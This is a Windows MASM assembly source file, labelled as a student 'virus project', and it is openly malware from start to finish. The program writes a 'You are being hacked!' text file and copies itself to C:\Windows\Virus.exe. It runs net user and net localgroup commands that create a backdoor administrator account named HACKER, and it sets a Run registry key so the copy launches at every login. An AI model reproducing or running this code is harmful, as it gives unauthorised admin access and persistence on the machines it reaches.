; John Hall & Corey Maryan
; CSCI2450
; virus project

; Preserve Identifier case /cp must be set

.386
.MODEL flat, stdcall

INCLUDE \masm32\include\advapi32.inc
INCLUDE \masm32\include\kernel32.inc
INCLUDE \masm32\include\msvcrt.inc
INCLUDE \masm32\include\windows.inc
INCLUDELIB \masm32\lib\advapi32.lib
INCLUDELIB \masm32\lib\kernel32.lib
INCLUDELIB \masm32\lib\msvcrt.lib

.data
buffer         BYTE "You are being hacked!",0
bytesWritten   DWORD ?
createAdmin    BYTE "net localgroup administrators HACKER /add > NULL",0
createUser     BYTE "net user /add HACKER HACKER > NULL",0
fileHandle     DWORD ?
fileName       BYTE MAX_PATH DUP(?),0
newFileName    BYTE "C:\Windows\Virus.exe",0
regHandle      DWORD ?
subKey         BYTE "SOFTWARE\Microsoft\Windows\CurrentVersion\Run",0
txtFile        BYTE "C:\Virus.txt", 0

.code
main PROC

; CreateFile(LPCTSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE)
     push NULL                     ; hTemplateFile
     push FILE_ATTRIBUTE_NORMAL    ; dwFlagsAndAttributes
     push CREATE_ALWAYS            ; dwCreationDisposition
     push NULL                     ; lpSecurityAttributes
     push FILE_SHARE_WRITE         ; dwShareMode
     push GENERIC_WRITE            ; dwDesiredAccess
     push OFFSET txtFile           ; lpFileName
     call CreateFile               ; calls CreateFile

; WriteFile(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED)
     mov fileHandle, eax
     push NULL                     ; lpOverlapped
     push OFFSET bytesWritten      ; lpNumberOfBytesToWrite
     push SIZEOF buffer            ; nNumberOfBytesToWrite
     push OFFSET buffer            ; lpBuffer
     push fileHandle               ; hfile
     call WriteFile                ; calls WriteFile
     push fileHandle               ; hfile
     call CloseHandle              ; calls CloseHandle

; GetModuleFileName(HMODULE, LPTSTR, DWORD)
     push SIZEOF fileName          ; nsize
     push OFFSET fileName          ; lpFilename
     push NULL                     ; hModule
     call GetModuleFileName        ; call getmodulefilename

; CopyFile(LPCTSTR, LPCTSTR, BOOL)
     push FALSE                    ; bfailifexits
     push OFFSET newFileName       ; lpnewfilename
     push OFFSET fileName          ; lpexisting filename
     call CopyFile                 ; call copyfile

; Create user & add to admin
     push OFFSET createUser        ; creates user
     call crt_system               ; calls system
     push OFFSET createAdmin       ; adds user to admin
     call crt_system               ; calls system
     
; RegOpenKeyEx(HKEY, LPCTSTR, DWORD, REGSAM, PHKEY)
     push OFFSET regHandle         ; phkresult
     push KEY_ALL_ACCESS           ; samDesired
     push 0                        ; ulOptions
     push OFFSET subKey            ; lpSubKey
     push HKEY_CURRENT_USER        ; hkey
     call RegOpenKeyEx             ; calls RegOpenKeyEx

; RegSetValueEx(HKEY, LPCTSTR, DWORD, DWORD, BYTE, DWORD)
     push SIZEOF newFileName       ; cbdata
     push OFFSET newFileName       ; lpdata
     push REG_SZ                   ; dwtype
     push 0                        ; reserved
     push NULL                     ; lpvaluename
     push regHandle                ; hkey
     call RegSetValueEx            ; call regsetvalueex

; Exitprocess(UINT)
     push 0                        ; uexitcode
     call ExitProcess              ; call exitprocess

main ENDP
END main